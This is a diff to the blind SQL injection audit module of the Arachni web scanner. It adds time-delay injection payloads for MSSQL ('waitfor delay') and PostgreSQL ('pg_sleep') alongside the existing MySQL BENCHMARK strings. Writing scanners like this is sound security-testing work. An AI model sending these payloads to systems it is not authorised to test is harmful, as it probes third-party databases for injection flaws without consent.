@@ -18,7 +18,7 @@ module Audit
 #
 # Blind SQL injection audit module
 # 
-# It uses a MySQL timing attack.<br/>
+# It uses a SQL timing attacks.<br/>
 # This is going to be greatly improved in the future<br/>
 # to support other DBs as well. 
 #
@@ -58,7 +58,15 @@ class BlindSQLInjection < Arachni::Module::Base
             # MySQL
             ' AND BENCHMARK(5000000,ENCODE(1,1)) --',
             '\' AND BENCHMARK(5000000,ENCODE(1,1)) --',
-            '" AND BENCHMARK(5000000,ENCODE(1,1)) --'
+            '" AND BENCHMARK(5000000,ENCODE(1,1)) --',
+            # MSSQL
+            ';waitfor delay \'0:0:5\'--',
+            '\';waitfor delay \'0:0:5\'--',
+            '";waitfor delay \'0:0:5\'--',
+            # PostgreSQL
+            ';SELECT pg_sleep(5);--',
+            '\';SELECT pg_sleep(5);--',
+            '\";SELECT pg_sleep(5);--'
         ]
         
     end
